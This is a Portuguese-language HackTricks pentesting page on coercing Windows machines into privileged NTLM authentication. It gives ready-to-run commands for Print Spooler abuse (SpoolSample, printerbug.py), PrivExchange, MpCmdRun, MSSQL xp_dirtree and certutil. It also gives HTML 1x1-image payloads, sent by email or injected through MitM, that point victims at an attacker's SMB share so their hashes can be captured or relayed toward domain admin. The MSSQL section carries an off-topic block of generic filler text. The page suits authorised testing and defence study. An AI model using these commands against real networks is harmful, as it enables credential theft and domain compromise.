# Forçar Autenticação Privilegiada NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) é uma **coleção** de **gatilhos de autenticação remota** codificados em C# usando o compilador MIDL para evitar dependências de terceiros.

## Abuso do Serviço Spooler

Se o serviço _**Print Spooler**_ estiver **habilitado**, você pode usar algumas credenciais do AD já conhecidas para **solicitar** ao servidor de impressão do Controlador de Domínio uma **atualização** sobre novos trabalhos de impressão e simplesmente dizer para **enviar a notificação para algum sistema**.\
Observe que quando a impressora envia a notificação para um sistema arbitrário, ela precisa **autenticar-se** nesse **sistema**. Portanto, um invasor pode fazer com que o serviço _**Print Spooler**_ se autentique em um sistema arbitrário, e o serviço **usará a conta do computador** nessa autenticação.

### Encontrando Servidores Windows no domínio

Usando o PowerShell, obtenha uma lista de máquinas Windows. Os servidores geralmente têm prioridade, então vamos nos concentrar neles:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Encontrando serviços de Spooler em execução

Usando uma versão ligeiramente modificada do [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) do @mysmartlogin (Vincent Le Toux), verifique se o serviço de Spooler está em execução:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Você também pode usar o rpcdump.py no Linux e procurar pelo Protocolo MS-RPRN
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Solicitar que o serviço se autentique em um host arbitrário

Você pode compilar [**SpoolSample a partir daqui**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou use [**dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) do 3xocyte ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se estiver no Linux.
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinando com Delegação Irrestrita

Se um invasor já comprometeu um computador com [Delegação Irrestrita](unconstrained-delegation.md), o invasor poderia **fazer com que a impressora se autentique neste computador**. Devido à delegação irrestrita, o **TGT** da **conta de computador da impressora** será **salvo na** **memória** do computador com delegação irrestrita. Como o invasor já comprometeu este host, ele será capaz de **recuperar esse ticket** e abusar dele ([Pass the Ticket](pass-the-ticket.md)).

## Autenticação Forçada de RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

O ataque `PrivExchange` resulta de uma falha no recurso de `PushSubscription` do servidor Exchange, que permite que **qualquer usuário de domínio com uma caixa de correio force o servidor Exchange a se autenticar** em qualquer host fornecido pelo cliente via HTTP.

O serviço Exchange é executado como **SYSTEM** e é **superprivilegiado** por padrão (ou seja, possui privilégios WriteDacl no domínio antes da Atualização Cumulativa de 2019). Essa falha pode ser aproveitada para **relay para o LDAP e despejar o banco de dados NTDS do domínio**. Se não for possível fazer o relay para o LDAP, isso pode ser aproveitado para fazer o relay e autenticar em **outros hosts** dentro do domínio. Este ataque o levará diretamente ao Administrador de Domínio com qualquer conta de usuário de domínio autenticada.

****[**Esta técnica foi copiada daqui.**](https://academy.hackthebox.com/module/143/section/1276)****

## Dentro do Windows

Se você já estiver dentro da máquina Windows, pode forçar o Windows a se conectar a um servidor usando contas privilegiadas com:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

O Microsoft SQL Server (MSSQL) é um sistema de gerenciamento de banco de dados relacional desenvolvido pela Microsoft. Ele é amplamente utilizado para armazenar e recuperar dados em aplicativos corporativos e de negócios.

MSSQL oferece recursos avançados, como suporte a transações, integridade de dados, segurança e escalabilidade. Ele também suporta a linguagem de consulta SQL para manipulação de dados e consultas.

Como um hacker, é importante entender o MSSQL e suas vulnerabilidades para explorar possíveis pontos fracos em um sistema. Isso pode incluir técnicas como injeção de SQL, ataques de força bruta, exploração de vulnerabilidades conhecidas e acesso não autorizado.

Ao realizar testes de penetração em um sistema MSSQL, é essencial seguir uma metodologia cuidadosa e ética para evitar danos ou violações de segurança. Isso pode incluir a obtenção de permissões adequadas, a obtenção de consentimento por escrito e a documentação de todas as atividades realizadas.

Lembre-se sempre de que a exploração de vulnerabilidades em sistemas MSSQL sem permissão é ilegal e pode resultar em consequências legais graves. É importante agir de forma responsável e ética ao realizar testes de penetração.
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Ou use esta outra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

É possível usar o certutil.exe (binário assinado pela Microsoft) para forçar a autenticação NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Injeção de HTML

### Por meio de e-mail

Se você conhece o **endereço de e-mail** do usuário que faz login em uma máquina que você deseja comprometer, você pode simplesmente enviar um **e-mail com uma imagem 1x1** como esta:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
e quando ele abrir, ele tentará autenticar.

### MitM

Se você conseguir realizar um ataque MitM a um computador e injetar HTML em uma página que ele visualizará, você pode tentar injetar uma imagem como a seguinte na página:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Quebrando o NTLMv1

Se você conseguir capturar os desafios NTLMv1, leia aqui como quebrá-los.\
_Lembre-se de que, para quebrar o NTLMv1, você precisa definir o desafio do Responder como "1122334455667788"_

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
